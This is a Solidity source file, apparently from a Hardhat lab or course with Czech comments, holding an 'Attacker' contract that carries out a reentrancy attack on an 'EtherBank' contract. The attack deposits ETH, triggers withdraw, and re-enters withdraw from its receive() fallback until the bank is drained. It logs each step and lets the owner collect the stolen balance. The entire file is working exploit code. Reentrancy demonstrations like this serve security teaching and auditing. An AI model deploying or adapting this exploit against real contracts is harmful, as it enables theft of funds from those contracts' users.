// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "hardhat/console.sol";

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IEtherBank public immutable etherBank;
    address private owner;

    constructor(address etherBankAddress) {
        etherBank = IEtherBank(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Must send ETH to attack");
        console.log("Starting attack with:", msg.value, "wei");
        console.log("Depositing ETH into EtherBank...");
        etherBank.deposit{value: msg.value}();
        console.log("Withdraw initiated...");
        etherBank.withdraw();
    }

    receive() external payable {
        console.log("Received:", msg.value, "wei from EtherBank");
        console.log("Attacker balance now:", address(this).balance);
        if (address(etherBank).balance > 0) {
            console.log("Reentering...");
            etherBank.withdraw();
        } else {
            console.log("Victim account drained. Keeping funds in Attacker contract.");
        }
    }

    // Explicitní funkce pro výběr prostředků vlastníkem
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw funds");
        uint balance = address(this).balance;
        require(balance > 0, "No funds to withdraw");
        console.log("Withdrawing funds to owner:", balance);
        payable(owner).transfer(balance);
    }

    // Kontrola celkového zůstatku útočníka
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
